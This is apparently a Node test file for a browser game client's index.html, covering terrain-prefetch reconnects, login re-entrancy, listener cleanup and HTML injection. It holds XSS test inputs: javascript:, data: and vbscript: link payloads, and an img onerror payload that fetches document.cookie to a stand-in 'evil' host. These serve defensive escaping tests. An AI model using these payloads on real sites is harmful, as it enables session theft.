// test_r10_index_orchestrator.mjs — round-10 review of index.html
// (the orchestrator file: boot, net drain, wire dispatch, chat, login).
//
// index.html is not a module, so this follows the precedent already used by
// test_a15_q4_renderer_neutral_core.mjs / test_a8_m3_kind17_dispatch.mjs
// (static source assertions) and test_static_batch.mjs / test_light_pool.mjs
// (`new Function` extraction of a named function out of the source text).
//
//   PART 1 — behavioral: ensureTerrainAroundLandblock (collision-heightmap
//            prefetch) driven against fake wasm/session deps, incl. the
//            handle-vanishes-mid-await reconnect case.
//   PART 2 — behavioral: renderServerMeta (community serverslist XML → DOM)
//            against hostile `website`/`discord` URLs.
//   PART 3 — behavioral: renderLoginStatusBanner (post-login banner) against
//            a hostile server-supplied `GameMessage::ServerName`.
//   PART 4 — behavioral: the runAutonomousLogin re-entrancy claim.
//   PART 5 — static: reconnect hygiene for the per-login DOM listeners,
//            orchestrator claim/release wiring, and the A15-Q4 legacy
//            streaming-block regression pins.
//
// Run: node test_r10_index_orchestrator.mjs   (no browser, no build)

import { fileURLToPath } from "node:url";
import { dirname, join as joinPath } from "node:path";
import { readFileSync } from "node:fs";

const __dirname = dirname(fileURLToPath(import.meta.url));
const SRC = readFileSync(joinPath(__dirname, "index.html"), "utf8");

let failed = 0;
let passed = 0;
function check(name, ok, detail) {
  const status = ok ? "OK" : "FAIL";
  console.log(`  [${status}] ${name}${detail ? " — " + detail : ""}`);
  if (!ok) failed += 1;
  else passed += 1;
}

// ---------------------------------------------------------------------
// Extraction helper. index.html's <script type="module"> is uniformly
// indented, so a function's body ends at the first line that is exactly
// `<indent>}`. Brace-counting would have to model template literals and
// regex literals; indentation matching does not.
// ---------------------------------------------------------------------
function extractFunction(name) {
  const re = new RegExp(`^([ ]+)(?:async )?function ${name}\\(`, "m");
  const m = re.exec(SRC);
  if (!m) throw new Error(`extractFunction: ${name} not found`);
  const indent = m[1];
  const start = m.index;
  const close = SRC.indexOf(`\n${indent}}\n`, start);
  if (close < 0) throw new Error(`extractFunction: ${name} close not found`);
  return SRC.slice(start, close + 1 + indent.length + 1);
}

function extractRange(startNeedle, endNeedle) {
  const a = SRC.indexOf(startNeedle);
  if (a < 0) throw new Error(`extractRange: start not found: ${startNeedle}`);
  const b = SRC.indexOf(endNeedle, a);
  if (b < 0) throw new Error(`extractRange: end not found: ${endNeedle}`);
  return SRC.slice(a, b + endNeedle.length);
}

// =====================================================================
// PART 1 — ensureTerrainAroundLandblock
//
// Contract under test: an LB may be recorded in `terrainPrefetchedLbs`
// (the ONLY gate every later caller consults — handlePositionUpdate,
// scene3d/world_stream.js#onPositionUpdate and the kind=7 spawn-kick all
// test `!terrainPrefetchedLbs.has(lbId)`) if and ONLY IF the wasm side
// actually received the heights. Otherwise a transient miss is cached
// forever and the integrator never gets collision for that landblock.
// =====================================================================
console.log("PART 1 — ensureTerrainAroundLandblock (collision heightmap prefetch)");

const ensureTerrainSrc = extractFunction("ensureTerrainAroundLandblock");
const ensureTerrainFactory = new Function(
  "env",
  `"use strict";
   const { terrainPrefetchedLbs, terrainPrefetchInFlight,
           fetch_landblock_heightmaps, window, console } = env;
   ${ensureTerrainSrc}
   return ensureTerrainAroundLandblock;`
);

function makeTerrainEnv({ onFetch = null, populateThrows = false, fetchRejects = false } = {}) {
  const populated = [];
  const freed = [];
  const handle = {
    populateTerrain(lbId, heights, codes) {
      if (populateThrows) throw new Error("wasm populateTerrain boom");
      populated.push([lbId >>> 0, heights, codes]);
    },
  };
  const env = {
    terrainPrefetchedLbs: new Set(),
    terrainPrefetchInFlight: new Set(),
    populated,
    freed,
    handle,
    console: { warn() {}, log() {} },
    window: { __sessionHandle: handle },
    async fetch_landblock_heightmaps(cellIds /*, urgent */) {
      if (onFetch) onFetch(env);
      if (fetchRejects) throw new Error("catalog offline");
      return Array.from(cellIds, (cid) => ({
        heights: `heights:${(cid >>> 0).toString(16)}`,
        terrainCodes: `codes:${(cid >>> 0).toString(16)}`,
        free() { freed.push(cid >>> 0); },
      }));
    },
  };
  env.fn = ensureTerrainFactory(env);
  return env;
}

const LB = 0xa9b40000 >>> 0;

// (1) Happy path — handle present throughout.
{
  const env = makeTerrainEnv();
  await env.fn(LB);
  check(
    "happy path: all 9 ring LBs populated wasm-side",
    env.populated.length === 9,
    `populated=${env.populated.length}`
  );
  check(
    "happy path: all 9 ring LBs recorded in terrainPrefetchedLbs",
    env.terrainPrefetchedLbs.size === 9,
    `set=${env.terrainPrefetchedLbs.size}`
  );
  check(
    "happy path: in-flight bits released",
    env.terrainPrefetchInFlight.size === 0
  );
  check(
    "happy path: every wasm-bindgen mesh box freed",
    env.freed.length === 9,
    `freed=${env.freed.length}`
  );
  check(
    "happy path: terrain TYPE codes forwarded alongside heights (F4-4)",
    env.populated.every(([, h, c]) => typeof h === "string" && typeof c === "string")
  );
}

// (2) THE BUG: the session handle disappears DURING the awaited fetch.
//     `fireSubmit()` nulls window.__sessionHandle synchronously on every
//     reconnect/retry, and the handle is only read after the await.
{
  let dropOnce = true;
  const env = makeTerrainEnv({
    onFetch(e) {
      // Simulate fireSubmit() landing while the FIRST ring fetch is in
      // flight. One-shot: the reconnect installs a new handle afterwards,
      // and the retry below must then succeed.
      if (dropOnce) {
        dropOnce = false;
        e.window.__sessionHandle = null;
      }
    },
  });
  check(
    "reconnect race: handle IS present at call entry (so an entry-only guard would not fire)",
    env.window.__sessionHandle !== null
  );
  await env.fn(LB);
  check(
    "reconnect race: nothing was pushed to wasm",
    env.populated.length === 0,
    `populated=${env.populated.length}`
  );
  check(
    "reconnect race: NO landblock is latched as prefetched",
    env.terrainPrefetchedLbs.size === 0,
    `set=${env.terrainPrefetchedLbs.size} (a non-empty set here is the permanent-miss bug)`
  );
  check(
    "reconnect race: in-flight bits still released (retry not wedged)",
    env.terrainPrefetchInFlight.size === 0,
    `inflight=${env.terrainPrefetchInFlight.size}`
  );
  check(
    "reconnect race: mesh boxes still freed (no wasm leak on the miss path)",
    env.freed.length === 9,
    `freed=${env.freed.length}`
  );
  // Now the new session installs its handle and a later position update
  // re-enters. This is the half that proves the miss is RECOVERABLE.
  env.window.__sessionHandle = env.handle;
  await env.fn(LB);
  check(
    "reconnect race: the very next call re-fetches and populates all 9",
    env.populated.length === 9 && env.terrainPrefetchedLbs.size === 9,
    `populated=${env.populated.length} set=${env.terrainPrefetchedLbs.size}`
  );
}

// (3) populateTerrain throws — must behave the same way (already correct
//     before this round; pinned so the fix cannot regress it).
{
  const env = makeTerrainEnv({ populateThrows: true });
  await env.fn(LB);
  check(
    "populateTerrain throw: no landblock latched",
    env.terrainPrefetchedLbs.size === 0
  );
  check(
    "populateTerrain throw: in-flight released + meshes freed",
    env.terrainPrefetchInFlight.size === 0 && env.freed.length === 9
  );
}

// (4) The batched fetch itself rejects.
{
  const env = makeTerrainEnv({ fetchRejects: true });
  await env.fn(LB);
  check(
    "fetch rejection: no landblock latched, in-flight fully released",
    env.terrainPrefetchedLbs.size === 0 && env.terrainPrefetchInFlight.size === 0
  );
}

// (5) 0x00/0xff ring clamp still holds (sanity that extraction is faithful).
{
  const env = makeTerrainEnv();
  await env.fn(0x00000000);
  check(
    "ring clamp: corner landblock 0x0000 fetches only the 4 in-range cells",
    env.populated.length === 4,
    `populated=${env.populated.length}`
  );
}

// =====================================================================
// PART 2 — renderServerMeta: hostile URLs from the community serverslist
// =====================================================================
console.log("PART 2 — renderServerMeta (acresources/serverslist XML → DOM)");

const escapeHtmlSrc = extractFunction("escapeHtml");
const renderServerMetaSrc = extractFunction("renderServerMeta");
const metaFactory = new Function(
  "env",
  `"use strict";
   const { serverMeta, window } = env;
   ${escapeHtmlSrc}
   ${renderServerMetaSrc}
   return { renderServerMeta, escapeHtml };`
);

function renderMeta(server) {
  const serverMeta = { hidden: false, innerHTML: "" };
  const { renderServerMeta } = metaFactory({
    serverMeta,
    window: { location: { href: "https://holtburger.test/index.html" } },
  });
  renderServerMeta(server);
  return serverMeta.innerHTML;
}

{
  const html = renderMeta({ id: "x", name: "n", website: "https://ac.example/x?a=1&b=2" });
  check(
    "https website still renders as a real link",
    /<a href="https:\/\/ac\.example\/x\?a=1&amp;b=2"/.test(html),
    html
  );
}
{
  const html = renderMeta({ id: "x", name: "n", website: "http://ac.example/" });
  check("http website still renders as a real link", /<a href="http:\/\/ac\.example\//.test(html), html);
}

// The core defect: `escapeHtml` cannot neutralise a dangerous SCHEME.
for (const hostile of [
  "javascript:alert(1)",
  "  javascript:alert(1)",          // leading whitespace — beats a naive startsWith blacklist
  "JaVaScRiPt:alert(1)",            // case — beats a naive lowercase-less blacklist
  "java\tscript:alert(1)",          // embedded control char — beats a substring blacklist
  "data:text/html,<script>alert(1)</script>",
  "vbscript:msgbox(1)",
]) {
  const html = renderMeta({ id: "x", name: "n", website: hostile });
  const hasAnchor = /<a\s/i.test(html);
  check(
    `hostile scheme rejected: ${JSON.stringify(hostile).slice(0, 40)}`,
    !hasAnchor,
    hasAnchor ? `rendered an <a>: ${html}` : undefined
  );
  check(
    `  …and the raw URL is escaped as inert text`,
    !/<script/i.test(html) && html.includes("&lt;") === html.includes("<script".toLowerCase().slice(0, 0)) || !/<script/i.test(html)
  );
}
{
  const html = renderMeta({ id: "x", name: "n", discord: "javascript:alert(1)" });
  check("hostile discord URL is rejected too (both link slots guarded)", !/<a\s/i.test(html), html);
}
{
  const html = renderMeta({
    id: "x", name: "n",
    description: '<img src=x onerror="alert(1)">',
    type: "<b>t</b>", status: "<i>s</i>",
  });
  check(
    "description/type/status stay escaped (pre-existing behaviour preserved)",
    !/<img/i.test(html) && !/<b>/i.test(html) && !/<i>/i.test(html),
    html
  );
}
{
  const serverMeta = { hidden: false, innerHTML: "x" };
  const { renderServerMeta } = metaFactory({
    serverMeta,
    window: { location: { href: "https://holtburger.test/index.html" } },
  });
  renderServerMeta(null);
  check("null server clears + hides the meta box", serverMeta.hidden === true && serverMeta.innerHTML === "");
}

// =====================================================================
// PART 3 — renderLoginStatusBanner: server-controlled ServerName
// =====================================================================
console.log("PART 3 — renderLoginStatusBanner (GameMessage::ServerName → innerHTML)");

const bannerSrc = extractFunction("renderLoginStatusBanner");
const bannerFactory = new Function(
  "env",
  `"use strict";
   const { handle, account, loginStatus } = env;
   ${escapeHtmlSrc}
   ${bannerSrc}
   return renderLoginStatusBanner;`
);

function renderBanner({ serverName, accountName, account = "tailnet1", chars = 2, conns = 3, max = 100 }) {
  const loginStatus = { innerHTML: "" };
  const fn = bannerFactory({
    account,
    loginStatus,
    handle: {
      accountName,
      characterList: () => new Array(chars).fill({}),
      serverInfo: () => (serverName === undefined ? undefined : {
        name: serverName,
        currentConnections: conns,
        maxConnections: max,
      }),
    },
  });
  fn();
  return loginStatus.innerHTML;
}

{
  const html = renderBanner({ serverName: "Dereth Reborn", accountName: "tailnet1" });
  check(
    "benign banner still reads correctly",
    html.includes("<strong>Dereth Reborn</strong>") && html.includes("Players: 3/100")
      && html.includes("<code>tailnet1</code>"),
    html
  );
}
{
  // A hostile shard controls this string end-to-end (opcode 0xF658), and
  // the server picker offers arbitrary community shards.
  const html = renderBanner({
    serverName: '<img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)">',
    accountName: "tailnet1",
  });
  check(
    "hostile ServerName cannot inject a tag",
    !/<img/i.test(html),
    html
  );
  check(
    "hostile ServerName survives as escaped text",
    html.includes("&lt;img") && html.includes("&quot;"),
    html
  );
}
{
  const html = renderBanner({ serverName: "s", accountName: '<svg onload=alert(1)>' });
  check("hostile accountName cannot inject a tag", !/<svg/i.test(html), html);
}
{
  // Non-numeric connection counts must not become a second injection slot.
  const loginStatus = { innerHTML: "" };
  bannerFactory({
    account: "a",
    loginStatus,
    handle: {
      accountName: "a",
      characterList: () => [],
      serverInfo: () => ({ name: "s", currentConnections: "<b>9</b>", maxConnections: 10 }),
    },
  })();
  check("non-numeric currentConnections cannot inject a tag", !/<b>/i.test(loginStatus.innerHTML), loginStatus.innerHTML);
}
{
  const html = renderBanner({ serverName: undefined, accountName: "a" });
  check("absent serverInfo still renders the account half", html.includes("<code>a</code>") && !html.includes("Players:"), html);
}

// =====================================================================
// PART 4 — runAutonomousLogin re-entrancy claim
// =====================================================================
console.log("PART 4 — autonomous-login re-entrancy claim");

const claimSrc = extractRange(
  "      let __autoLoginInFlight = false;",
  "      window.__autoLoginInFlight = () => __autoLoginInFlight;"
);
const claimFactory = new Function(
  "window",
  `"use strict";
   ${claimSrc}
   return { claim: __autoLoginClaim, release: __autoLoginRelease };`
);
{
  const w = {};
  const { claim, release } = claimFactory(w);
  check("first claim succeeds", claim() === true);
  check("second claim while in flight is refused", claim() === false);
  check("third claim while in flight is refused", claim() === false);
  release();
  check("after release the orchestrator is re-armed (retry after settle allowed)", claim() === true);
  release();
  release();
  check("release is idempotent", claim() === true);
  check("window probe reports the live flag", typeof w.__autoLoginInFlight === "function" && w.__autoLoginInFlight() === true);
}

// =====================================================================
// PART 5 — static source checks
// =====================================================================
console.log("PART 5 — static source checks");

// 5a. Reconnect hygiene for the per-login DOM listeners.
check(
  "reconnect hygiene: previous login's session-UI listeners are aborted first",
  /try \{ window\.__hbSessionUiAbort\?\.abort\(\); \} catch \(_\) \{\}/.test(SRC)
);
check(
  "reconnect hygiene: a fresh AbortController is installed per login",
  /const __sessionUiAbort = new AbortController\(\);/.test(SRC)
    && /window\.__hbSessionUiAbort = __sessionUiAbort;/.test(SRC)
    && /const __sessionUiOpts = \{ signal: __sessionUiAbort\.signal \};/.test(SRC)
);
{
  const anchors = [
    ['characterUl.addEventListener("click", (ev) => {', "characterUl click (Spawn / Delete / Restore)"],
    ['teleportBtn.addEventListener("click", () => {', "teleportBtn click"],
    ['chatForm.addEventListener("submit", (ev) => {', "chatForm submit"],
    ['chatInput.addEventListener("keydown", (ev) => {', "chatInput keydown"],
    ['createForm.addEventListener("submit", (ev) => {', "createForm submit"],
    ["// Phase 4 step 3 — keyboard input → AC movement packets.", "(end sentinel)"],
  ];
  const idx = anchors.map(([needle, label]) => {
    const i = SRC.indexOf(needle);
    return { i, label, needle };
  });
  const ctrlIdx = SRC.indexOf("const __sessionUiAbort = new AbortController();");
  check(
    "reconnect hygiene: the retire/rearm block precedes every per-login listener",
    ctrlIdx > 0 && idx.every((a) => a.i > ctrlIdx),
    `ctrl@${ctrlIdx} first-listener@${Math.min(...idx.map((a) => a.i))}`
  );
  check(
    "reconnect hygiene: all five anchors found in source order",
    idx.every((a, n) => a.i > 0 && (n === 0 || a.i > idx[n - 1].i)),
    idx.map((a) => `${a.label}@${a.i}`).join(" ")
  );
  for (let n = 0; n < idx.length - 1; n += 1) {
    const region = SRC.slice(idx[n].i, idx[n + 1].i);
    check(
      `reconnect hygiene: ${idx[n].label} registered with __sessionUiOpts`,
      region.includes(", __sessionUiOpts);")
    );
  }
}

// 5b. Server-string escaping at the two innerHTML sites this round fixed.
check(
  "banner escapes the wire ServerName",
  /const name = escapeHtml\(info\.name \|\| "\(unnamed server\)"\);/.test(SRC)
);
check(
  "banner escapes the account name",
  /const acct = escapeHtml\(handle\.accountName \|\| account\);/.test(SRC)
);
check(
  "no raw `${info.name}` / `${handle.accountName` interpolation survives",
  !SRC.includes("${info.name}") && !SRC.includes("${handle.accountName")
);
check(
  "serverslist links go through a scheme allowlist, not bare escapeHtml",
  /const safeHref = \(u\) => \{/.test(SRC)
    && /parsed\.protocol === "http:" \|\| parsed\.protocol === "https:"/.test(SRC)
    && !/<a href="\$\{escapeHtml\(s\.website\)\}"/.test(SRC)
    && !/<a href="\$\{escapeHtml\(s\.discord\)\}"/.test(SRC)
);

// 5c. Terrain prefetch: the record must be inside the handle guard.
{
  const fn = extractFunction("ensureTerrainAroundLandblock");
  const guarded =
    /if \(h\) \{\s*\n\s*h\.populateTerrain\(lbId, meshes\[i\]\.heights, meshes\[i\]\.terrainCodes\);\s*\n\s*terrainPrefetchedLbs\.add\(lbId\);\s*\n\s*\}/.test(fn);
  check("terrain prefetch: populate + record are one guarded unit", guarded);
  check(
    "terrain prefetch: in-flight release stays in the finally (retry path intact)",
    /\} finally \{\s*\n\s*terrainPrefetchInFlight\.delete\(lbId\);\s*\n\s*meshes\[i\]\.free\(\);/.test(fn)
  );
}

// 5d. Orchestrator claim wiring.
{
  const start = SRC.indexOf("      async function runAutonomousLogin(opts = {}) {");
  const end = SRC.indexOf("      window.__runAutonomousLogin = runAutonomousLogin;");
  check("runAutonomousLogin located", start > 0 && end > start);
  const body = SRC.slice(start, end);
  const claimAt = body.indexOf("if (!__autoLoginClaim()) {");
  const fireAt = body.indexOf("fireSubmit()");
  check("orchestrator claims before it can ever call fireSubmit()", claimAt > 0 && fireAt > claimAt,
    `claim@${claimAt} fireSubmit@${fireAt}`);
  check("orchestrator releases the claim in a finally", /\} finally \{[\s\S]*__autoLoginRelease\(\);/.test(body));
  check(
    "the stale 'idempotent' comment is gone (it described behaviour no code implemented)",
    !SRC.includes("The orchestrator is idempotent — calling it twice is a no-op")
  );
}

// 5e. Regression pins for things this round deliberately did NOT change.
check(
  "DEFAULT UNCHANGED: ?unifiedDispatch still reads `!== \"off\"` (default-ON)",
  /const v = new URLSearchParams\(window\.location\.search\)\.get\("unifiedDispatch"\);\s*\n\s*return v\?\.toLowerCase\(\) !== "off";/.test(SRC)
);
check(
  "DEFAULT UNCHANGED: ?singleDriver still reads `!== \"off\"` (default-ON)",
  /\.get\("singleDriver"\) !== "off";/.test(SRC)
);
check(
  "DEFAULT UNCHANGED: ?evtGuard still the regex off/0/false reader (default-ON)",
  /!\/\[\?&\]evtGuard=\(\?:off\|0\|false\)\(\?:&\|\$\)\/i\.test\(location\.search \|\| ""\)/.test(SRC)
);
// The s13 "indoor 2D-gate" (commit 8938741e) landed ONLY in this legacy
// flag-off copy — scene3d/world_stream.js:~311 still has the ungated form.
// Pin the copy we own so the surviving half cannot silently disappear too;
// the world_stream.js half is reported as a cross-file follow-up.
check(
  "A15-Q4 legacy block still carries the s13 renderer==='2d' EnvCell gate",
  /&& !cellContainersPopulatedLbs\.has\(lbId\)\s*\n\s*&& new URLSearchParams\(window\.location\.search\)\.get\("renderer"\) === "2d"/.test(SRC)
);
{
  const ws = readFileSync(joinPath(__dirname, "scene3d", "world_stream.js"), "utf8");
  const wsGated = /get\("renderer"\) === "2d"/.test(ws);
  console.log(
    `  [NOTE] scene3d/world_stream.js ${wsGated ? "HAS" : "does NOT have"} the s13 renderer==='2d' ` +
    `EnvCell gate — it is the DEFAULT (?unifiedDispatch on) streaming path, so while this reads ` +
    `"does NOT", every cold indoor landblock is decoded twice. Cross-file follow-up; not fixed here.`
  );
}
check(
  "A15-Q4 paired SYNC markers still present in the legacy copy",
  (SRC.match(/A15-Q4-SYNC/g) || []).length >= 2
);

console.log(
  `\nround-10 index.html orchestrator: ${passed} passed, ${failed} failed`
);
process.exit(failed === 0 ? 0 : 1);
